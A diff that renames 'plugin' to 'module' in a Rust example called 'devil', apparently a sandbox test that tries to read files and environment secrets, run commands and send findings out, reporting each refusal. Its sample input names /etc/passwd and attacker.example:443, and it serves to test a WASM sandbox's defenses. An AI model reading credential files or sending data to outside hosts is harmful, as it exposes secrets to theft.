@@ -1,7 +1,7 @@
-//! devil, an example plugin in Rust: it tries, in plain sight, what a plugin must never do: read the instance's files
+//! devil, an example module in Rust: it tries, in plain sight, what a module must never do: read the instance's files
 //! and the server's, see the environment (where secrets live), run a command (what $os.cmd does in pb_hooks), write a
 //! file, and send what it found to attacker.example. Each try says "refused: <why>" or "GOT: <what>". Under ext/wasm
-//! every one is refused: the plugin is a closed box, JSON in and JSON out, and nothing else exists for it.
+//! every one is refused: the module is a closed box, JSON in and JSON out, and nothing else exists for it.
 //!
 //!   stdin:  {"steal": "/etc/passwd", "sendTo": "attacker.example:443"}   (both optional)
 //!
@@ -11,10 +11,10 @@ use std::io::{Read, Write};
 use std::{env, fs, net, process};
 
 fn main() {
-    // the function asked for: --describe prints the manifest (plugin.json beside the source); "run" is the only other
+    // the function asked for: --describe prints the manifest (manifest.json beside the source); "run" is the only other
     match std::env::args().nth(1).as_deref() {
         Some("--describe") => {
-            print!("{}", include_str!("../plugin.json"));
+            print!("{}", include_str!("../manifest.json"));
             return;
         }
         Some("run") => {}
@@ -60,6 +60,6 @@ fn main() {
 
     let escaped = got.values().filter(|v| v.as_str().is_some_and(|s| s.starts_with("GOT"))).count();
     let verdict = if escaped == 0 { "nothing got out of the box".to_string() } else { format!("{escaped} ways out!") };
-    let why = "a plugin gets stdin, stdout and stderr, nothing else: no files, no environment, no processes, no network";
+    let why = "a module gets stdin, stdout and stderr, nothing else: no files, no environment, no processes, no network";
     print!("{}", json!({ "tried": got, "verdict": verdict, "why": why }));
 }
